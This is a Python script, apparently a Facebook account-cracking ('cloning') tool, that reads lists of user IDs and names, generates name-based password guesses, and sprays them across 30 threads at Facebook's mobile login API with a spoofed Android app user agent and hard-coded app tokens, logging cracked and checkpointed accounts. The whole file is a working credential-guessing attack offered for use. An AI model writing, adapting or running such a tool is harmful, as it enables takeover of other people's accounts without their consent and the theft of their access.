"""GIFT 🎁"""

#_______modeule_______#
import os
from time import sleep as slp
from concurrent.futures import ThreadPoolExecutor as ted
import uuid
import random 
import httpx
import json
import sys
#####clour######
G = '\033[1;32m'
#####clear######
ualist=[]
loop=0
oks=[]
cps=[]
def clear():
	os.system("clear")
	print(logo)
#####linexxx----#
line = f"\033[1;38m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
#####my info####

logo = f"""
            ┳┳┓┳┓  ┏┓┳┓ ┏┓  ┓┏┓┏┓┓
            ┃┃┃┣┫  ┣ ┃┃ ┣   ┃┃┫┃┫┃
            ┛ ┗┛┗  ┻ ┻┗┛┗┛  ┻┗┛┗┛┻
\033[1;38m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━                      
<|> WRITTEN BY : MD ARAFAT HOSSEN MUGDHO
<|> GITHAB : MD-ARAFAT1001
<|> FACEBOOK : MD ARAFAT HOSSEN MUGDHO
"""
#####line#######
def line():
	print(f"\033[1;38m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
#####menu#####

def menu():
	clear()
	line()
	print("<|> FILE CLONEING 1 ")
	print("<|> RANDOM CLONING [COMING] 2")
	print("<|> FILE CLONEING PART-2 [3]")
	line()
	arafat=input("<|> CHOICE : ")
	if arafat in ['1','01']:
		file()
	if arafat in ['2','02']:clear();print("coming");menu()
	else :
		os.system("exit");menu()
###
def file():
    clear()
    line()
    filex=input('<|> ENTER YOUR FILE  PATH : ')
    try:
        fo=open(filex,'r').read().splitlines()
    except FileNotFoundError:
        print('<|> FILE NOT FOUND');slp(2)
        file()
    clear()
    try:
        pas_limit=int(input('<|> ENTER PASSWORD LIMIT (1-20) : '))
    except:
        pas_limit=1
    line()
    pas_list=[]
    for i in range(pas_limit):
        pasx=input(f'<|> ENTER PASSWORD {i+1} : ')
        pas_list.append(pasx)
    with ted(max_workers=30) as Arafat:
        tl=str(len(fo))
        clear()
        print('<|> TOTAL ACCOUNT : '+tl)
        print('<|> IF YOU GET NO RESULTS USE BIMAN')
        line()
        for user in fo:
            ids,names=user.split('|')
            passlist=pas_list
            Arafat.submit(m1,ids,names,passlist)
    line()
    print('<|> THE CRACK PROCESS HAS BEEN END')
    input('<|> PRESS ENTER TO BACK : ')
    main()
#----------method------------#
def m1(ids,names,passlist):
    global oks,loop
    try:
        fn=names.split(' ')[0]
        try:
            ln=names.split(' ')[1]
        except:
            ln=fn
        for pw in passlist:
            sys.stdout.write('\r\r [<|> ARAFAT <|>] %s|CRACKING:%s '%(loop,len(oks)));sys.stdout.flush()
            pas=pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            data={'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'community_id': '', 'cpl': 'true', 'try_num': '1', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'currently_logged_in_userid': '0', 'locale': 'en_US', 'client_country_code': 'US', 'fb_api_req_friendly_name': 'authenticate', 'api_key': '882a8490361da98702bf97a021ddc14d', 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            head={'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 11.0.0;   Build/R [FBAN/FB4A;FBAV/317.0.0.22377;FBBV/236731528;FBDM/{density=1.0,width=1080,height=1920};FBLC/en_US;FBRV/236731528;FBMF/AMR SAWYA;FBBD/A;FBPN/com.facebook.adsmanager;FBDV/ ;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
'Accept-Encoding': 'gzip, deflate', 
'Accept': '*/*', 
'Connection': 'close', 
'Content-Type': 'application/x-www-form-urlencoded', 
'Host': 'graph.facebook.com', 
'X-FB-Net-HNI': str(random.randint(20000,40000)), 
'X-FB-SIM-HNI': str(random.randint(20000,40000)), 
'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
'X-FB-Connection-Type': 'WIFI', 
'X-Tigon-Is-Retry': 'False', 
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 
'x-fb-device-group': str(random.randint(1000,9999)), 
'X-FB-Friendly-Name': 'ViewerReactionsMutation', 
'X-FB-Request-Analytics-Tags': 'graphservice', 
'X-FB-HTTP-Engine': 'Liger', 
'X-FB-Client-IP': 'True', 
'X-FB-Server-Cluster': 'True', 
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
            url='https://b-graph.facebook.com/auth/login'
            req=httpx.post(url,data=data,headers=head).json()
            if 'session_key' in req:
                print('\r\r\033[1;32m [<|> ARAFAT OK <|>] '+ids+'|'+pas)
                oks.append(ids)
                break
            elif 'www.facebook.com' in req['error']['message']:
                print('\r\r\033[1;31m [<|> ARAFAT OK <|>] '+ids+'|'+pas)
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
####
menu()









